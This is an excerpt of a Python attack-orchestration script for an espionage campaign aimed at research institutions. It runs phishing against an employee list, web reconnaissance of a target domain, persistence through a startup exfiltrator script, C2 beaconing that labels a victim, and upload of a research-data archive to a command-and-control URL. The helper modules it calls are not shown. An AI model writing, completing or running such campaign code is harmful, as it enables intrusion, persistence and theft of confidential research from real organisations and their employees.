...
def main():
    """
    Main function to run the research_institution_campaign campaign.
    """
    print(f"[*] Starting research_institution_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("research_institutions_employees.txt")
    run_tool("apt_web_recon.js", "--target research_institutions.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/scientific_research_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-RESEARCH_INSTITUTIONS-01")
    ...
    exfiltration.exfiltrate_data("scientific_research/scientific_research.zip", "https://c2.example.com/upload")
    run_tool("payloads/scientific_research_exfiltrator.py")
